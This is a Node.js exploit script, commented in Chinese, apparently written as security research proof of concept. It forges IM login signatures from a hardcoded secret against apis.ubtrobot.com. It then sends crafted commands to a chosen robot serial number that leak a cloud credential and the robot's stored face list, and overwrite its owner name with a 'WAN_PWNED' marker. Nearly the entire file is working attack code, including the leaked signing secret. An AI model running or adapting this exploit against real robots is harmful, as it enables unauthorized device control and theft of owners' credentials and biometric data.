// im_control_test.js — WAN 未授权控制组合实证：
//   cmd 108 取 TVS productId（云凭据泄露）
//   cmd 116 取人脸列表（PII 泄露）
//   cmd 99  SetMasterName（写入型控制，可逆）
// 全部命令号 ≤127、报文全 ASCII，可过 web SDK UTF-8 传输。
// 用法: node im_control_test.js <fromUserId> <robotSN>
require('./shim');
const TIM = require('tim-js-sdk');
const https = require('https');
const crypto = require('crypto');

const SDKAPPID = 1400032988;

function mintUserSig(userId) {
  return new Promise((resolve, reject) => {
    const t = Date.now().toString();
    const sig = crypto.createHash('md5').update('IM$SeCrET' + t).digest('hex');
    const qs = `signature=${sig}&time=${t}&userId=${encodeURIComponent(userId)}&channel=MINIEDUCN`;
    https.get(`https://apis.ubtrobot.com/im/getInfo?${qs}`, res => {
      let b = '';
      res.on('data', d => b += d);
      res.on('end', () => {
        try {
          const j = JSON.parse(b);
          if (j.returnCode === '0' && j.returnMap && j.returnMap.userSig) resolve(j.returnMap.userSig);
          else reject(new Error('getInfo failed: ' + b.slice(0, 200)));
        } catch (e) { reject(e); }
      });
    }).on('error', reject);
  });
}

const sleep = ms => new Promise(r => setTimeout(r, ms));

// AlphaMessage{ header{cmd, ver=1, serial} body } — 全字节 <0x80
function buildMsg(cmd, serial, bodyFields) {
  const header = [0x08, cmd, 0x10, 1, 0x18, serial];
  const body = bodyFields || [];
  const msg = [0x0a, header.length, ...header, 0x12, body.length, ...body];
  if (msg.some(b => b > 0x7f)) throw new Error('non-ASCII byte in payload');
  return String.fromCharCode(...msg);
}
const ascii = s => [...s].map(c => c.charCodeAt(0) & 0x7f);
const strField = (field, s) => [(field << 3) | 2, s.length, ...ascii(s)];

(async () => {
  const [fromId, robotId] = [process.argv[2], process.argv[3]];
  if (!fromId || !robotId) { console.error('usage: node im_control_test.js <from> <robotSN>'); process.exit(1); }

  const tim = TIM.create({ SDKAppID: SDKAPPID });
  tim.setLogLevel(0);
  let readyResolve;
  const ready = new Promise(r => readyResolve = r);
  tim.on(TIM.EVENT.SDK_READY, () => readyResolve());
  tim.on(TIM.EVENT.KICKED_OUT, e => console.log('[!] KICKED_OUT:', JSON.stringify(e.data)));
  tim.on(TIM.EVENT.MESSAGE_RECEIVED, e => {
    e.data.forEach(m => {
      let p = '';
      try { p = JSON.stringify(m.payload); } catch (_) {}
      console.log('[!!!] 回包 from=', m.from, 'payload=', p.slice(0, 400));
    });
  });

  const userSig = await mintUserSig(fromId);
  await tim.login({ userID: <账户_01>, userSig });
  console.log('[+] 已登录为', fromId);
  await Promise.race([ready, sleep(10000)]);

  const marker = 'WAN_PWNED_' + Math.floor(Math.random() * 900 + 100);
  const steps = [
    ['cmd108 取TVS productId(云凭据)', buildMsg(108, 81, [])],
    ['cmd116 取人脸列表(PII)', buildMsg(116, 82, [0x08, 1, 0x10, 20])],   // page=1 pageSize=20
    [`cmd99 SetMasterName=${marker}(写入控制)`, buildMsg(99, 83, strField(1, marker))],
  ];
  for (const [label, data] of steps) {
    const msg = tim.createCustomMessage({
      to: robotId, conversationType: TIM.TYPES.CONV_C2C,
      payload: { data, description: '', extension: '' },
    });
    try {
      const r = await tim.sendMessage(msg);
      console.log('[+] 已投递:', label, 'status=', r.data.message.status);
    } catch (e) {
      console.log('[-] 投递失败:', label, e.code, e.message);
    }
    await sleep(6000);
  }
  console.log('[*] 再等 10s 收尾...');
  await sleep(10000);
  try { await tim.logout(); } catch (e) {}
  console.log('[i] marker =', marker, '（供 SSH 侧核对 MASTER_NAME）');
  process.exit(0);
})().catch(e => { console.error('[-] 失败:', e.code || '', e.message); process.exit(2); });
